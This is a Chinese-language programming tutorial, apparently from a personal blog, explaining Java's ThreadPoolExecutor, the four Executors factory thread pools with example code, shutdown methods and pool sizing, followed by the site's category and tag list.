ThreadPoolExecutor是线程池的真正实现,他通过构造方法的一系列参数，来构成不同配置的线程池。corePoolSize： 核心池的大小。 当有任务来之后，就会创建一个线程去执行任务，当线程池中的线程数目达到corePoolSize后，就会把到达的任务放到缓存队列当中maximumPoolSize： 线程池最大线程数，它表示在线程池中最多能创建多少个线程；keepAliveTime： 表示线程没有任务执行时最多保持多久时间会终止。unit： 参数keepAliveTime的时间单位，有7种取值，在TimeUnit类中有7种静态属性。workQueue：一个阻塞队列，提交的任务将会被放到这个队列里。threadFactory：线程工厂，用来创建线程，主要是为了给线程起名字，默认工厂的线程名字：pool-1-thread-3。handler：拒绝策略，当线程池里线程被耗尽，且队列也满了的时候会调用。 线程池的创建方法Java通过Executors（jdk1.5并发包）提供四种线程池，分别为： newCachedThreadPool创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。案例演示: newFixedThreadPool 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。 newScheduledThreadPool 创建一个定长线程池，支持定时及周期性任务执行。 newSingleThreadExecutor 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。 12345678910111213141516171819202122232425262728293031323334newCachedThreadPool创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。package cn.qbz.thread;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class Test111907 &#123; public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; 10; i++) &#123; final int temp = i; executorService.execute(new Runnable() &#123; @Override public void run() &#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(Thread.currentThread().getName() + \" i=\" + temp); &#125; &#125;); &#125; &#125;&#125; public static ExecutorService newCachedThreadPool() &#123; return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;()); &#125; 12345678910111213141516171819202122232425262728293031323334newFixedThreadPool创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。package cn.qbz.thread;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class Test111907 &#123; public static void main(String[] args) &#123; ExecutorService executorService = Executors.newFixedThreadPool(3); for (int i = 0; i &lt; 10; i++) &#123; final int temp = i; executorService.execute(new Runnable() &#123; @Override public void run() &#123; try &#123; Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(Thread.currentThread().getName() + \" i=\" + temp); &#125; &#125;); &#125; &#125;&#125; public static ExecutorService newFixedThreadPool(int nThreads) &#123; return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;()); &#125; 1234567891011121314151617181920212223242526272829303132333435363738newScheduledThreadPool创建一个定长线程池，支持定时及周期性任务执行。package cn.qbz.thread;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;import java.util.concurrent.ScheduledExecutorService;import java.util.concurrent.TimeUnit;public class Test111907 &#123; public static void main(String[] args) &#123; final long begin = System.currentTimeMillis(); ExecutorService executorService = Executors.newScheduledThreadPool(3); for (int i = 0; i &lt; 10; i++) &#123; final int temp = i; final long time = begin; executorService.schedule(new Runnable() &#123; @Override public void run() &#123; try &#123; Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(Thread.currentThread().getName() + \" i=\" + temp + \" time=\" + (System.currentTimeMillis() - time)); &#125; &#125;, 5, TimeUnit.SECONDS); &#125; &#125;&#125; public static ScheduledExecutorService newScheduledThreadPool(int corePoolSize) &#123; return new ScheduledThreadPoolExecutor(corePoolSize); &#125; public ScheduledThreadPoolExecutor(int corePoolSize) &#123; super(corePoolSize, Integer.MAX_VALUE, 0, TimeUnit.NANOSECONDS, new DelayedWorkQueue()); &#125; 12345678910111213141516171819202122newSingleThreadExecutor创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。public class Test111907 &#123; public static void main(String[] args) &#123; ExecutorService executorService = Executors.newSingleThreadExecutor(); for (int i = 0; i &lt; 10; i++) &#123; final int temp = i; executorService.execute(new Runnable() &#123; @Override public void run() &#123; try &#123; Thread.sleep(100); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(Thread.currentThread().getName() + \" i=\" + temp); &#125; &#125;); &#125; &#125;&#125; 关闭线程池关闭线程池有两种方式：shutdown和shutdownNow，关闭时，会遍历所有的线程，调用它们的interrupt函数中断线程。但这两种方式对于正在执行的线程处理方式不同。 shutdown()仅停止阻塞队列中等待的线程，那些正在执行的线程就会让他们执行结束。 shutdownNow()不仅会停止阻塞队列中的线程，而且会停止正在执行的线程。 ThreadPoolExecutor运行机制当有请求到来时： 若当前实际线程数量 少于 corePoolSize，即使有空闲线程，也会创建一个新的工作线程； 若当前实际线程数量处于corePoolSize和maximumPoolSize之间，并且阻塞队列没满，则任务将被放入阻塞队列中等待执行； 若当前实际线程数量 小于 maximumPoolSize，但阻塞队列已满，则直接创建新线程处理任务； 若当前实际线程数量已经达到maximumPoolSize，并且阻塞队列已满，则使用饱和策略。 设置合理的线程池大小任务一般可分为：CPU密集型、IO密集型、混合型，对于不同类型的任务需要分配不同大小的线程池。 CPU密集型任务 尽量使用较小的线程池，一般为CPU核心数+1。因为CPU密集型任务使得CPU使用率很高，若开过多的线程数，只能增加上下文切换的次数，因此会带来额外的开销。 IO密集型任务可以使用稍大的线程池，一般为2*CPU核心数。IO密集型任务CPU使用率并不高，因此可以让CPU在等待IO的时候去处理别的任务，充分利用CPU时间。 混合型任务可以将任务分成IO密集型和CPU密集型任务，然后分别用不同的线程池去处理。只要分完之后两个任务的执行时间相差不大，那么就会比串行执行来的高效。因为如果划分之后两个任务执行时间相差甚远，那么先执行完的任务就要等后执行完的任务，最终的时间仍然取决于后执行完的任务，而且还要加上任务拆分与合并的开销，得不偿失。 Executor两级调度模型 在HotSpot虚拟机中，Java中的线程将会被一一映射为操作系统的线程。在Java虚拟机层面，用户将多个任务提交给Executor框架，Executor负责分配线程执行它们；在操作系统层面，操作系统再将这些线程分配给处理器执行。 Executor结构 Executor框架中的所有类可以分成三类： 任务任务有两种类型：Runnable和Callable。 任务执行器Executor框架最核心的接口是Executor，它表示任务的执行器。Executor的子接口为ExecutorService。ExecutorService有两大实现类：ThreadPoolExecutor和ScheduledThreadPoolExecutor。 执行结果Future接口表示异步的执行结果，它的实现类为FutureTask。 线程池Executors工厂类可以创建四种类型的线程池，通过Executors.newXXX即可创建。 1. FixedThreadPool 123public static ExecutorService newFixedThreadPool(int nThreads)&#123; return new ThreadPoolExecutor(nThreads,nThreads,0L,TimeUnit.MILLISECONDS,new LinkedBlockingQueue&lt;Runnable&gt;());&#125; 它是一种固定大小的线程池； corePoolSize和maximunPoolSize都为用户设定的线程数量nThreads； keepAliveTime为0，意味着一旦有多余的空闲线程，就会被立即停止掉；但这里keepAliveTime无效； 阻塞队列采用了LinkedBlockingQueue，它是一个无界队列； 由于阻塞队列是一个无界队列，因此永远不可能拒绝任务； 由于采用了无界队列，实际线程数量将永远维持在nThreads，因此maximumPoolSize和keepAliveTime将无效。 2. CachedThreadPool 1234 public static ExecutorService newCachedThreadPool()&#123; return new ThreadPoolExecutor(0,Integer.MAX_VALUE,60L,TimeUnit.MILLISECONDS,new SynchronousQueue&lt;Runnable&gt;()); &#125;123 它是一个可以无限扩大的线程池； 它比较适合处理执行时间比较小的任务； corePoolSize为0，maximumPoolSize为无限大，意味着线程数量可以无限大； keepAliveTime为60S，意味着线程空闲时间超过60S就会被杀死； 采用SynchronousQueue装等待的任务，这个阻塞队列没有存储空间，这意味着只要有请求到来，就必须要找到一条工作线程处理他，如果当前没有空闲的线程，那么就会再创建一条新的线程。 3. SingleThreadExecutor 1234public static ExecutorService newSingleThreadExecutor()&#123; return new ThreadPoolExecutor(1,1,0L,TimeUnit.MILLISECONDS,new LinkedBlockingQueue&lt;Runnable&gt;());&#125;123 它只会创建一条工作线程处理任务； 采用的阻塞队列为LinkedBlockingQueue； 4. ScheduledThreadPool 它用来处理延时任务或定时任务。 它接收SchduledFutureTask类型的任务，有两种提交任务的方式： scheduledAtFixedRate scheduledWithFixedDelay SchduledFutureTask接收的参数： time：任务开始的时间 sequenceNumber：任务的序号 period：任务执行的时间间隔 它采用DelayQueue存储等待的任务 DelayQueue内部封装了一个PriorityQueue，它会根据time的先后时间排序，若time相同则根据sequenceNumber排序； DelayQueue也是一个无界队列； 工作线程的执行过程： 工作线程会从DelayQueue取已经到期的任务去执行； 执行结束后重新设置任务的到期时间，再次放回DelayQueue 微信公众号:每日学习干货","categories":[],"tags":[]}],"categories":[{"name":"高数","slug":"高数","permalink":"https://kayleh.top/categories/%E9%AB%98%E6%95%B0/"},{"name":"C","slug":"C","permalink":"https://kayleh.top/categories/C/"},{"name":"linux","slug":"linux","permalink":"https://kayleh.top/categories/linux/"},{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"},{"name":"设计模式","slug":"设计模式","permalink":"https://kayleh.top/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"SpringMVC","slug":"SpringMVC","permalink":"https://kayleh.top/categories/SpringMVC/"}],"tags":[{"name":"java","slug":"java","permalink":"https://kayleh.top/tags/java/"},{"name":"Concurrency","slug":"Concurrency","permalink":"https://kayleh.top/tags/Concurrency/"},{"name":"algorithm","slug":"algorithm","permalink":"https://kayleh.top/tags/algorithm/"},{"name":"frame","slug":"frame","permalink":"https://kayleh.top/tags/frame/"},{"name":"middleware","slug":"middleware","permalink":"https://kayleh.top/tags/middleware/"},{"name":"test","slug":"test","permalink":"https://kayleh.top/tags/test/"},{"name":"security","slug":"security","permalink":"https://kayleh.top/tags/security/"},{"name":"network","slug":"network","permalink":"https://kayleh.top/tags/network/"},{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"},{"name":"io","slug":"io","permalink":"https://kayleh.top/tags/io/"},{"name":"jvm","slug":"jvm","permalink":"https://kayleh.top/tags/jvm/"},{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"},{"name":"JVM","slug":"JVM","permalink":"https://kayleh.top/tags/JVM/"},{"name":"sql","slug":"sql","permalink":"https://kayleh.top/tags/sql/"},{"name":"linux","slug":"linux","permalink":"https://kayleh.top/tags/linux/"},{"name":"project","slug":"project","permalink":"https://kayleh.top/tags/project/"},{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"},{"name":"front","slug":"front","permalink":"https://kayleh.top/tags/front/"},{"name":"docker","slug":"docker","permalink":"https://kayleh.top/tags/docker/"},{"name":"ad","slug":"ad","permalink":"https://kayleh.top/tags/ad/"},{"name":"maintain","slug":"maintain","permalink":"https://kayleh.top/tags/maintain/"},{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"},{"name":"about","slug":"about","permalink":"https://kayleh.top/tags/about/"},{"name":"Operating Systems","slug":"Operating-Systems","permalink":"https://kayleh.top/tags/Operating-Systems/"},{"name":"DesignPatterns","slug":"DesignPatterns","permalink":"https://kayleh.top/tags/DesignPatterns/"},{"name":"resume","slug":"resume","permalink":"https://kayleh.top/tags/resume/"},{"name":"computer","slug":"computer","permalink":"https://kayleh.top/tags/computer/"},{"name":"interview","slug":"interview","permalink":"https://kayleh.top/tags/interview/"}]}